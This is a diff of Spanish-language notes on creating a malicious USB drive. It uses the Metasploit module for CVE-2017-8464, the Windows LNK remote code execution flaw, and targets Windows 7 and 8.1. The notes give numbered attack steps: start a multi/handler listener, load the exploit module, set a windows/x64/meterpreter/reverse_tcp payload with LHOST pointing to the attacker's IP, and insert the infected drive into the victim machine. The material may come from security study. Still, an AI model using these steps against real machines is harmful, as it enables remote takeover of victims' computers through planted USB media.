@@ -1,4 +1,9 @@
 Crear un USB malicioso --
+La vulnerabilidad consiste en crear un USB malicioso para poder realizar un ataque a otra maquina.
+use exploit/windows/fileformat/cve_2017_8464_lnk_rce
+con el anterior comando se crean los archivos infectados y luego se procede a realizar el ataque introduciendo
+la memoria infectada en la maquina victima. 
+
 Sistemas operativos:
 windows 7
 windows 8.1
@@ -154,7 +159,7 @@ use exploit/multi/handler (crear handler para la conexión)
 8- show options (para verificar puerto)
 9- exploit -j
 10- back
-11- use exploit/windows/fileformat/cve_2017_8464_lnk_rce(creo los archivos)
+11- use exploit/windows/fileformat/cve_2017_8464_lnk_rce (creo los archivos)
 12- set payload windows/x64/meterpreter/reverse_tcp
 13- set LHOST 10.191.4.4(mi ip)
 14- show options
